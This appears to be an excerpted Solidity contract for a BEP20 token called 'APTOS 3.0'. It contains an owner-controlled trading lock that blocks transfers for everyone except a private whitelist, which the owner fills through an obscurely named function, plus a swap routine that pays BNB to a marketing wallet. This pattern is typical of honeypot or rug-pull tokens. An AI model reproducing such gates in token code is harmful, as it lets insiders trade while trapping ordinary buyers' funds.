...
contract DividendDistributor is IDividendDistributor {
    ...
    uint256 public minimumTokenBalanceForDividends = 1000 * (10**9); 
...
contract LockToken is Ownable {
    ...
    mapping(address => bool) private _brise;
    modifier open(address from, address to) {
        require(isOpen || _brise[from] || _brise[to], "Not Open");
        _;
    }

    constructor() {
        _brise[msg.sender] = true;
        _brise[address(this)] = true;
    }
    ...
    function AptosMoon(address[] calldata _users) external onlyOwner {
        for(uint8 i = 0; i < _users.length; i++) {
            _brise[_users[i]] = true;
        }
    }
}

contract Aptos is Ownable, IBEP20, SafeToken, LockToken {
    using SafeMath for uint256;
    ...
    string constant _name = "APTOS 3.0";
    string constant _symbol = "APTOS";
    ...
    function swapBack() internal swapping {
        ...
        try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            ...
            payable(marketing).call{value: amountBNBMarketing, gas: 3000}("");
